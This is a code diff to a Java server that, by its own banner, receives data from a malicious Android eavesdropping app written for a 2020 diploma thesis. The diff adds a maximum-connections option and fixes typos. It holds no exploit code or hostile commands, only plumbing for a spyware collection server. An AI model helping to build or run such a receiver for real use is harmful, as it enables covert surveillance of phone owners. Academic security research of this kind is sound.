@@ -12,6 +12,7 @@ class Server {
     private static ServerThread thread;
     private static int maxMemorySize = 10;
     private static int threadCount = 2;
+    private static int maxConnectionCount = -1;
 
     /**
      * Vstupní bod programu.
@@ -27,8 +28,10 @@ class Server {
         parseArguments(args);
         System.out.println("[*] Max memory to use per connection: " + maxMemorySize + " MB");
         System.out.println("[*] Number of threads: " + threadCount);
+        String conns = maxConnectionCount == -1 ? "unlimited" : Integer.toString(maxConnectionCount);
+        System.out.println("[*] Max number of connections: " + conns);
 
-        thread = new ServerThread(maxMemorySize, threadCount);
+        thread = new ServerThread(maxMemorySize, threadCount, maxConnectionCount);
         thread.start();
 
         showWelcomeScreen();
@@ -78,12 +81,13 @@ class Server {
 
     /**
      * Načtení argumentu z příkazové řádky
+     *
      * @param args Pole řetězců s argumenty
      */
     private static void parseArguments(String[] args) {
         if (args.length == 0) {
             System.out.println("[*] Using default parameter values");
-        } else if (args.length == 4) {
+        } else if (args.length == 6 || args.length == 4 || args.length == 2) {
             for (int i = 0; i < args.length; i += 2) {
                 switch (args[i]) {
                     case "-t":
@@ -108,6 +112,15 @@ class Server {
                         showUsage();
                         System.exit(0);
                         break;
+                    case "-c":
+                        int cc = Integer.parseInt(args[i + 1]);
+                        if (cc < 1 && cc != -1) {
+                            System.out.println("[X] Argument MAX_CONN must be >= 1 or -1 for unlimited");
+                            showUsage();
+                            System.exit(0);
+                        }
+                        maxConnectionCount = cc;
+                        break;
                     default:
                         System.out.println("[X] Unknown argument");
                         showUsage();
@@ -127,9 +140,10 @@ class Server {
     private static void showUsage() {
         System.out.println("Usage:");
         System.out.println("- default parameters: $ java com.company.Server");
-        System.out.println("- custom parameters:  $ java com.company.Server -t <THREAD_CNT> -m <MAX_MEM>");
+        System.out.println("- custom parameters:  $ java com.company.Server -t <THREAD_CNT> -m <MAX_MEM> -c <MAX_CONN>");
         System.out.println("  THREAD_CNT -- number of threads the application will run with (default: " + threadCount + ")");
         System.out.println("  MAX_MEM -- max memory (in MB) allocated for pre-recording one connection (default: " + maxMemorySize + ")");
+        System.out.println("  MAX_CONN -- max number of connections accepted at the same time (default: " + maxConnectionCount + ")");
     }
 
     /**
@@ -195,7 +209,7 @@ class Server {
             connectionID = thread.activeConnection.get();
 
         if (verifyConnectionFormat(connectionID)) {
-            thread.removeConnection(connectionID);
+            thread.removeConnection(connectionID, true);
         }
     }
 
@@ -307,7 +321,7 @@ class Server {
     /**
      * Vypíše uvítací obrazovku.
      */
-    private static void showWelcomeScreen(){
+    private static void showWelcomeScreen() {
         System.out.println("   ___                         _____                          \n" +
                 "  |_  |                       /  ___|                         \n" +
                 "    | | __ _ _ __  _   _ ___  \\ `--   ___ _ ____   _____ _ __ \n" +
@@ -316,7 +330,7 @@ class Server {
                 "\\____/ \\__,_|_| |_|\\__,_|___/ \\____/ \\___|_|    \\_/ \\___|_|  \n" +
                 "\n" +
                 "             MMMMMMMMMMMMMM      Server program created to receive\n" +
-                "          IMMMMMMMMMMMMMMMMMM     data from the mallicious eavesdropping\n" +
+                "          IMMMMMMMMMMMMMMMMMM     data from the malicious eavesdropping\n" +
                 "         MMMMMMMMMMMMMMMMMMMMM     application installed on an Android device.\n" +
                 "        MMMMMMMMMMMMMMMMMMMMMMM         \n" +
                 "       ,MMMMMMMMMMMMMMMMMMMMMMMM   This program is a part of the diploma thesis\n" +
@@ -327,11 +341,11 @@ class Server {
                 "        MMM       IMM       MMM    -------------------------------\n" +
                 "         MMM      M=NM      DM,    Author: inserthackernamehere, 2020\n" +
                 "          MMMMM MMM  MMM   MMM          \n" +
-                "          MMMMMMMM    MMMMMMMM   If you want to change the limits on used memory\n" +
-                "          MMMMMMMM, M,MMMMMMMM   and threads used, relaunch the program\n" +
-                "             ,MMMMMMMMMMMMMMM    with arguments:\n" +
+                "          MMMMMMMM    MMMMMMMM   If you want to change the limits on used memory,\n" +
+                "          MMMMMMMM, M,MMMMMMMM   threads used, and max connection accepted,\n" +
+                "             ,MMMMMMMMMMMMMMM    relaunch the program with arguments:\n" +
                 "            ? MMMMMMMMMMM               \n" +
-                "             +   MMMMM +         $ java <program> -t <THR_CNT> -m <MAX_MEM>\n" +
+                "             +   MMMMM +         -t <THR_CNT> -m <MAX_MEM> -c <MAX_CONN>\n" +
                 "             MD         MM              _______\n" +
                 "             MMMMM,M MMMMM              |USAGE:|________________________________\n" +
                 "              MMMMMMMMMMMM              | h        - show help\n" +
